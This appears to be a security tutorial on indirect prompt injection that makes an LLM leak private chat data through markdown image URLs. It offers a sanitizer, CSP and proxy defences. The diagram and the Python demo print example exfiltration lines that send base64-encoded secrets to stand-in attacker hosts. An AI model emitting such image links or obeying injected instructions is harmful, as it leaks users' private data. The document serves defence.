# AI Data Exfiltration: Mitigating LLM Markdown Injection and Out-of-Band Leakage

As Large Language Models (LLMs) are integrated into consumer-facing web applications, they are increasingly granted access to sensitive user data, such as private chats, emails, and financial records. This access has opened the door to a highly stealthy class of attacks: indirect prompt injection leading to out-of-band data exfiltration. By manipulating the LLM into generating malicious markdown images, attackers can silently exfiltrate private user context via simple HTTP GET requests.

## The Problem: Invisible Image Markdown Exfiltration

The core vulnerability lies in the client-side rendering of standard markdown formatting. Many AI chat interfaces automatically render markdown output—such as images and links—to provide a rich user experience. If an LLM processes untrusted third-party data (like an email or webpage containing a hidden injection payload), the injection can instruct the LLM to format a markdown image tag.

The source URL of this image is dynamically generated by the LLM to include base64-encoded snippets of the private conversation as a query parameter.

```text
[Untrusted Doc] ---> Contains Injection Payload
                          |
                          v
[Inference Engine] -> Processes Payload & User Chat History
                          |
                          v
[Client UI Engine] -> Receives Malicious Markdown: `![pixel](https://attacker.com/log?d=[BASE64_DATA])`
                          |
                          v (Renders HTML: <img src="https://attacker.com/...">)
[User Browser]    ---> Automatically Triggers HTTP GET -> [Attacker Server] (Data Leaked)
```

Because the browser renders the HTML image tag automatically, it performs an out-of-band GET request immediately upon display. The user sees nothing but a broken or invisible 1x1 pixel image, while their private session token or document content is fully transmitted to the attacker's server.

## Technical Architecture of Markdown Leak Prevention

Mitigating this attack vector requires a zero-trust approach to LLM-generated output. Since instruction-following models cannot be perfectly sandboxed through prompt engineering alone, security must be enforced programmatically at the presentation and network layers.

```text
+-------------------------------------------------------------------------+
|                       Safe Rendering Sandbox                            |
|                                                                         |
|  [LLM Output Stream] ---> [Markdown HTML Parser] ---> [Domain Filter]   |
|                                                            |            |
|                                                            v            |
|  [User Browser] <--- [Content Security Policy] <--- [Sanitized Output]  |
+-------------------------------------------------------------------------+
```

This defense relies on three pillars:
1. **Markdown AST Sanitization:** Reconstructing the markdown abstract syntax tree (AST) to filter or rewrite image sources before they reach the browser's DOM.
2. **Media Proxying:** Requiring all external media assets to be fetched through a secure, self-hosted proxy that strips headers and parameters.
3. **Content Security Policy (CSP):** Restricting where the browser can send outbound requests by enforcing a strict `img-src` policy.

## Implementation: Client-Side Content Sanitizer

The following Python program simulates an end-to-end exfiltration attack and demonstrates a robust markdown sanitization engine designed to strip untrusted dynamic assets before rendering.

```python
import base64
import re
from urllib.parse import urlparse
from typing import Set

class MarkdownSanitizer:
    def __init__(self, allowed_domains: Set[str]):
        self.allowed_domains = allowed_domains
        # Regular expression to extract Markdown image tags: ![alt](url)
        self.md_image_regex = re.compile(r'\!\[(.*?)\]\((.*?)\)')

    def sanitize_output(self, raw_llm_output: str) -> str:
        def replace_match(match):
            alt_text = match.group(1)
            url = match.group(2)
            parsed_url = urlparse(url)

            # Check if domain is in the explicit allowlist
            if parsed_url.netloc in self.allowed_domains:
                return f"![{alt_text}]({url})"

            # Block and log suspicious domain
            print(f"[SECURITY ALERT] Blocked unauthorized exfiltration image source: {url}")
            return f"[Blocked Image: {alt_text}]"

        return self.md_image_regex.sub(replace_match, raw_llm_output)

if __name__ == "__main__":
    # Simulated sensitive user chat history
    sensitive_context = "My API Access Token is: sk-proj-123456789abcde"
    encoded_secret = base64.b64encode(sensitive_context.encode()).decode()

    # Simulated malicious prompt injection payload generated by the LLM
    raw_payload = (
        f"Sure! I can help you with that request. "
        f"![tracking](https://malicious-attacker.com/pixel.png?exfil={encoded_secret}) "
        f"Please let me know if you need anything else!"
    )

    print("Initial LLM Response Payload (Malicious):")
    print(raw_payload)

    # Initialize sanitizer with trusted domains
    trusted_origins = {"trusted-media.enterprise.com", "cdn.internal.net"}
    sanitizer = MarkdownSanitizer(allowed_domains=trusted_origins)

    print("\nProcessing and sanitizing output...")
    sanitized_payload = sanitizer.sanitize_output(raw_payload)

    print("\nSanitized LLM Response (Safe to Render):")
    print(sanitized_payload)
```

## Security Engineering Implications

Relying on system prompts to instruct the LLM "not to generate markdown images" is structurally flawed. If the model is compromised via indirect injection, prompt constraints are overridden. Security teams must enforce strict browser-level and application-level controls.

First, apply a Content Security Policy (CSP) header: `Content-Security-Policy: default-src 'self'; img-src 'self' https://trusted-cdn.com;`. This completely blocks the browser from connecting to untrusted endpoints, rendering any injected image source harmless. Second, implement an out-of-band proxy for all user-generated media. Instead of loading third-party URLs directly, route them through an internal endpoint that resolves the image safely behind a firewall, sanitizing all metadata and query strings before forwarding the pixels to the client viewport.
